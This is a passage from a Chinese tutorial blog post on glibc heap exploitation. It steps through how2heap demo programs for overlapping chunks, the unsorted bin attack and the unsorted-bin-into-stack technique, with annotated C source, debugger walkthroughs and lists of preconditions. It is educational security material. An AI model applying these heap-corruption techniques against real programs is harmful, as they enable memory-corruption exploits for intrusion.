class="line"><span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="comment">// p2现在在unsorted bin中，时刻准备为新的malloc服务</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在模拟一下溢出来覆写p2的size</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 对实例程序而言,最后三个字节是什么并不重要,然而,我们最好还是维持一下堆的稳定性</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line"><span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line"><span class="comment">// 为了维持堆的稳定性，我门还是要把pre_inuse标志位设为1来确保我们的p1不会被错误的认为是一个free chunk</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line"><span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line"> evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们分配一个和p2被注入的size一样的大小的chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 这次的malloc将会从我们刚刚修改过size的unsorted bin中取出free chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们写进p4的内容就可以覆盖p3啦，同时，我们写进p3里的内容也可以修改p4的内容</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line"><span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-4"><a href="#运行结果及调试-4" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>我们断在申请三个chunk p1，p2，p3后，看看此时的堆块</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510369556/0" alt="image-20210510195421233"></p><p>然后给三个chunk赋初值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510377494/0" alt="image-20210510195646045"></p><p>此时我们走到free掉p2，此时我们的p2被放进了unsorted bin中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510382891/0" alt="image-20210510195820989"></p><p>接着我们假设我们溢出了chunk1，成功修改了chunk2的size为0x181</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510391587/0" alt="image-20210510200053341"></p><p>可以看到此时我们的chunk的size从0x101修改成了0x181，此时我们malloc p4将释放的chunk申请回来，此时p4就将整个p3都包含进去，在题目中我们可以切割p4，来将main_arena的地址放入到p3中，因为p3是没有释放的，我们可以利用p3来泄露地址等等。</p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>程序先是malloc了2个0x100大小的chunk,p1,p2,和一个大小为0x80的chunk,p3</p><p>紧接着,程序初始化了三个chunk,里面的值分别为1,2,3</p><p>之后程序free掉了p2,并假设拥有溢出的能力,通过溢出p1修改了p2的size域</p><p>此时p2的size是0x181,系统会认为我们有一个大小为0x180的在unsorted bin中的fake chunk</p><p>紧接着,我们再申请了一个大小为0x180的chunk p4,这样系统就会把我们unsorted bin中的free chunk也就是我们构造好的大小为0x180的fake chunk拿出来给p4</p><p>此时p4的后0x80的空间就和p3共享了,这就构成了overlapping_chunk! 堆重叠</p><p>这里依旧列出我们利用所需要的一些条件：</p><ol><li>某个chunk的size被修改，通过溢出或者某种手段，将它后面的，也就是高地址的chunk包含进去，或者包含一部分</li><li>这个被修改size的chunk要先free掉，该了size之后，在申请回来，一般是先将它放到unsorted bin，其他bin都是有size检查的</li></ol><h1 id="0x07-overlapping-chunks-2"><a href="#0x07-overlapping-chunks-2" class="headerlink" title="0x07 overlapping_chunks_2"></a>0x07 overlapping_chunks_2</h1><h2 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个也被称为不相邻的free chunk conslidation 攻击</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// malloc_usable_size函数可以获取chunk实际分配的内存大小  </span></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 为了方便看攻击效果，所以5个chunk分别为A,B,C,D,E  </span></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 现在我们free一下p4，在有p5邻接top chunk的情况下，我们释放p4不会引起p4与top chunk合并</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>(p4);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在我们通过溢出chunk p1将chunk p2的size改为p2+p3的大小并且将标注为设为正在使用来触发漏洞 </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在我们再free p2，这个时候ptmalloc就会认为下一个chunk是p4(p2的size已经被我们改为p2+p3了)</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这样就会创建一个大的错误包含p3的free chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="comment">// 现在我们再创建一个新的大小正好是我们创建的fake free chunk的新chunk </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);  </span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)p3); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-5"><a href="#运行结果及调试-5" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是看下申请完所有chunk的堆块，malloc5个0x3e8大小的chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510640149/0" alt="image-20210510210804170"></p><p>此时我们free掉chunk4</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510705641/0" alt="image-20210510212807142"></p><p>此时我们修改chuk2的size域为0x7e1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510711611/0" alt="image-20210510213016267"></p><p>此时我们再申请p6</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13510741490/0" alt="image-20210510213904156"></p><p>那么此时的p3已经包含再p6中了</p><h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><p>好了,程序首先malloc了5块大小为1008的chunk,p1,p2,p3,p4,p5</p><p>紧接着,程序free掉了p4,因为还有p5 紧邻着top chunk,因此p4并不会被合并到topchunk中</p><p><strong>这里要注意,在本例中,是否free p4的效果是一样的</strong></p><p>之后呢,为便于直观的看一下效果,将chunk按次序填满了A,B,C,D,E</p><p>紧接着,程序修改了chunk p2的size域大小为p2+p3,然后free掉了chunk p2</p><p>这个时候,系统会错误的把p2和p3合并的大chunk放进unsorted bin中并与我们的free chunk p4合并</p><p>然后申请了p2+p3大小的新chunk p6(所以我说其实不用free p4的…甚至都不用malloc p5 2333</p><p>此时p6的后半部分也就是p3大小的部分就与之前未free的p3重叠了:)</p><p>这里也做一下overlapping_chunks和overlapping_chunks_2的比较</p><p>overlapping_chunks中,程序更改了已经释放掉的chunk的size域而2则是修改了还未释放的chunk的size域,但是效果都是一样的,都是构造了一个重叠块 (overlapping chunk!</p><h1 id="0x08-unsorted-bin-attack"><a href="#0x08-unsorted-bin-attack" class="headerlink" title="0x08 unsorted bin attack"></a>0x08 unsorted bin attack</h1><p>unsorted bin attack的杀伤力虽然不够，但是也是不可小视的辅助攻击方式</p><p>在_int_malloc中有这么一段，他会在unsorted bin取出时被调用：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>这个bck是什么呢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim -&gt; bk</span><br></pre></td></tr></table></figure><p>因此我们只需要控制bk指针就可以让bck位置可控，而我们的bck-fd也就可控的，此时就可以往任意地址写一个东西，但是写的东西归我们控制，因此只能打辅助</p><h2 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h2><p>本demo使用unsorted bin attack技巧将一个很大的无符号long型值写进了栈里</p><p>在实际中,unsorted bin attack常常用于为其他的攻击做辅助,比如覆写global_max_fast来为fastbin attack做辅助</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// stack_var就是我们的攻击目标</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="comment">// 我们先在堆上分配一个正常的chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">    <span class="comment">// 现在我们释放的p将会被放入unsorted bin中，并且其bk指向p[1]</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">    <span class="comment">// 现在我们模拟有一个漏洞让我们可以覆写victim-bk指针</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="comment">// 现在我们再分配一次来取回我们刚刚free掉的chunk，此时攻击目标已经被改写了</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-6"><a href="#运行结果及调试-6" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是先看下分配完的堆块结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513335246/0" alt="image-20210511162319659"></p><p>然后将我们的p放入unsorted bin中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513338605/0" alt="image-20210511162411174"></p><p>然后给我们的p[1]赋值，也就是给我们p的bk赋值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513343261/0" alt="image-20210511162515662"></p><p>可以看到我们的bk指针已经被修改为了&amp;stack_var-2，此时取出我们的unsorted bin中的chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513355599/0" alt="image-20210511162741872"></p><p>可以看到此时我们的stack_var已经写成了unsortedbin(av)的值，其实就是把bk处也就是<code>0x7fffffffde08</code>当成chunk，并在它的bk位置写入一个值。</p><h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>程序首先定义了一个变量stack_var,紧接着malloc了两个chunk</p><p>之后Free掉了第一块chunk,并修改p-&gt;bk=&amp;stack_var,这个时候再malloc出来</p><p>然后我们的变量值就被改成了unsorted bin(av)的地址</p><p>在正常使用中,因为unsorted bin写入的值并非可控值,因此只是起到一个辅助的作用</p><p>依旧是列条件：</p><ol><li>首先是在unsorted bin中放入一个chunk，修改这个chunk的bk为 想要写值的地址-0x10</li><li>然后把这个unsorted bin申请回来</li></ol><h1 id="0x08-unsorted-bin-into-stack"><a href="#0x08-unsorted-bin-into-stack" class="headerlink" title="0x08 unsorted bin into stack"></a>0x08 unsorted bin into stack</h1><p>这个就是通过unsorted bin里的chunk的bk来达到在将chunk申请到栈上的效果</p><h2 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在栈上伪造一个chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">    <span class="comment">// 设置下一次分配的大小并且把bk指针指向任意可写地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">    <span class="comment">// 现在假设我们有一个漏洞可以让我们覆写victim-&gt;size和victim-&gt;bk指针</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">    <span class="comment">// size必须和下一个请求的size不同以返回一个fake_chunk并且需要bypass 2*SIZE_SZ&gt;16 &amp;&amp; 2*SIZE&lt;av-&gt;system-&gt;mem 的检查</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们就可以返回我们的fake_chunk了</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-7"><a href="#运行结果及调试-7" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>依旧是断在了malloc完的情况，但是我这里不知道为什么多了一个0x411的chunk，这里我们直接忽略它就行</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513481257/0" alt="image-20210511165058888"></p><p>此时我们free掉了victim</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513486486/0" alt="image-20210511165202470"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513497857/0" alt="image-20210511165418590"></p><p>此时我们在栈上伪造了一个chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13513533507/0" 